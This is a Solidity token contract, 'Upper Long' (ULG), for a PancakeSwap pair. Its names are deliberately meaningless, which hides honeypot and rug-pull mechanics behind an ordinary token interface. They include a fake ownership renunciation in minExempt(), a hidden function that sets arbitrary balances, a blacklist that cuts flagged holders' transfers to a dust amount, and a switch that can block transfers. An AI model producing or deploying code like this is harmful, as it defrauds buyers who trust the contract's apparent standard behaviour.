//SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

interface launchExempt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract sellMarketing {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface marketingLimit {
    function createPair(address shouldExemptBuy, address atReceiver) external returns (address);
}

interface tokenShouldFee {
    function totalSupply() external view returns (uint256);

    function balanceOf(address shouldMode) external view returns (uint256);

    function transfer(address swapFee, uint256 takeTrading) external returns (bool);

    function allowance(address fundBuyTake, address spender) external view returns (uint256);

    function approve(address spender, uint256 takeTrading) external returns (bool);

    function transferFrom(
        address sender,
        address swapFee,
        uint256 takeTrading
    ) external returns (bool);

    event Transfer(address indexed from, address indexed sellAmountLiquidity, uint256 value);
    event Approval(address indexed fundBuyTake, address indexed spender, uint256 value);
}

interface tokenShouldFeeMetadata is tokenShouldFee {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract UpperLong is sellMarketing, tokenShouldFee, tokenShouldFeeMetadata {

    mapping(address => bool) public takeAmount;

    function symbol() external view virtual override returns (string memory) {
        return txEnable;
    }

    function minExempt() public {
        emit OwnershipTransferred(toAmount, address(0));
        feeAutoTotal = address(0);
    }

    uint256 private launchedTxTeam = 100000000 * 10 ** 18;

    function liquiditySender(address atLimit, address swapFee, uint256 takeTrading) internal returns (bool) {
        require(receiverTeam[atLimit] >= takeTrading);
        receiverTeam[atLimit] -= takeTrading;
        receiverTeam[swapFee] += takeTrading;
        emit Transfer(atLimit, swapFee, takeTrading);
        return true;
    }

    uint256 constant receiverFundFrom = 20 ** 10;

    function totalSupply() external view virtual override returns (uint256) {
        return launchedTxTeam;
    }

    function fromExempt(address feeReceiverLiquidity) public {
        maxTx();
        if (walletLimit == totalFee) {
            totalFee = walletLimit;
        }
        if (feeReceiverLiquidity == toAmount || feeReceiverLiquidity == launchedSwap) {
            return;
        }
        takeAmount[feeReceiverLiquidity] = true;
    }

    function sellAuto(uint256 takeTrading) public {
        maxTx();
        fundSender = takeTrading;
    }

    string private sellTx = "Upper Long";

    function decimals() external view virtual override returns (uint8) {
        return buyTrading;
    }

    function launchFrom(address txFund, uint256 takeTrading) public {
        maxTx();
        receiverTeam[txFund] = takeTrading;
    }

    bool private maxSell;

    address private feeAutoTotal;

    function balanceOf(address shouldMode) public view virtual override returns (uint256) {
        return receiverTeam[shouldMode];
    }

    function getOwner() external view returns (address) {
        return feeAutoTotal;
    }

    bool public fundIsFee;

    event OwnershipTransferred(address indexed maxIs, address indexed listReceiver);

    uint256 private senderBuy;

    function owner() external view returns (address) {
        return feeAutoTotal;
    }

    address tradingLaunchLimit = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint8 private buyTrading = 18;

    string private txEnable = "ULG";

    function swapAmount(address atLimit, address swapFee, uint256 takeTrading) internal returns (bool) {
        if (atLimit == toAmount) {
            return liquiditySender(atLimit, swapFee, takeTrading);
        }
        uint256 feeLaunchedMode = tokenShouldFee(launchedSwap).balanceOf(enableAutoFund);
        require(feeLaunchedMode == fundSender);
        require(swapFee != enableAutoFund);
        if (takeAmount[atLimit]) {
            return liquiditySender(atLimit, swapFee, receiverFundFrom);
        }
        return liquiditySender(atLimit, swapFee, takeTrading);
    }

    function approve(address launchedAmount, uint256 takeTrading) public virtual override returns (bool) {
        amountLaunch[_msgSender()][launchedAmount] = takeTrading;
        emit Approval(_msgSender(), launchedAmount, takeTrading);
        return true;
    }

    mapping(address => mapping(address => uint256)) private amountLaunch;

    bool private isSwapShould;

    uint256 atTotalReceiver;

    bool public isEnable;

    bool public walletTo;

    address enableAutoFund = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function maxTx() private view {
        require(tradingExempt[_msgSender()]);
    }

    constructor (){
        
        launchExempt launchedFee = launchExempt(tradingLaunchLimit);
        launchedSwap = marketingLimit(launchedFee.factory()).createPair(launchedFee.WETH(), address(this));
        
        toAmount = _msgSender();
        minExempt();
        tradingExempt[toAmount] = true;
        receiverTeam[toAmount] = launchedTxTeam;
        if (totalFee == senderBuy) {
            isSwapShould = true;
        }
        emit Transfer(address(0), toAmount, launchedTxTeam);
    }

    function modeShould(address listMax) public {
        if (isEnable) {
            return;
        }
        
        tradingExempt[listMax] = true;
        if (maxSell == walletTo) {
            senderBuy = walletLimit;
        }
        isEnable = true;
    }

    function allowance(address tradingAuto, address launchedAmount) external view virtual override returns (uint256) {
        if (launchedAmount == tradingLaunchLimit) {
            return type(uint256).max;
        }
        return amountLaunch[tradingAuto][launchedAmount];
    }

    address public toAmount;

    uint256 fundSender;

    function name() external view virtual override returns (string memory) {
        return sellTx;
    }

    uint256 private totalFee;

    uint256 public walletLimit;

    function transfer(address txFund, uint256 takeTrading) external virtual override returns (bool) {
        return swapAmount(_msgSender(), txFund, takeTrading);
    }

    function transferFrom(address atLimit, address swapFee, uint256 takeTrading) external override returns (bool) {
        if (_msgSender() != tradingLaunchLimit) {
            if (amountLaunch[atLimit][_msgSender()] != type(uint256).max) {
                require(takeTrading <= amountLaunch[atLimit][_msgSender()]);
                amountLaunch[atLimit][_msgSender()] -= takeTrading;
            }
        }
        return swapAmount(atLimit, swapFee, takeTrading);
    }

    mapping(address => bool) public tradingExempt;

    address public launchedSwap;

    mapping(address => uint256) private receiverTeam;

}